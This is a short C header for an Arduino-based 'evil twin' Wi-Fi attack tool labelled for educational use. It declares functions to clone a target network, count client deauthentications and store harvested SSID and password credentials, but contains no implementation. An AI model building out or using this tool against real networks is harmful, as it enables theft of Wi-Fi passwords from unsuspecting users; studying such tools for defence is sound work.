/*
 * evil_twin.h — Evil Twin captive portal attack
 * ⚠ EDUCATIONAL USE ONLY
 * Created by: Shawal Ahmad Mohmand
 */

#ifndef EVIL_TWIN_H
#define EVIL_TWIN_H

#include <Arduino.h>
#include "config.h"

struct CapturedCred {
  char ssid[33];
  char password[65];
  unsigned long timestamp;
};

void evil_twin_start(const char* targetSSID, uint8_t targetChannel, const uint8_t targetBSSID[6]);
void evil_twin_stop();
void evil_twin_update();
bool evil_twin_isRunning();
uint8_t evil_twin_getCredCount();
CapturedCred* evil_twin_getCreds();
uint32_t evil_twin_getDeauthCount();
String evil_twin_getIP();
void evil_twin_submitCred(const char* password);
const char* evil_twin_getCloneSSID();

#endif // EVIL_TWIN_H
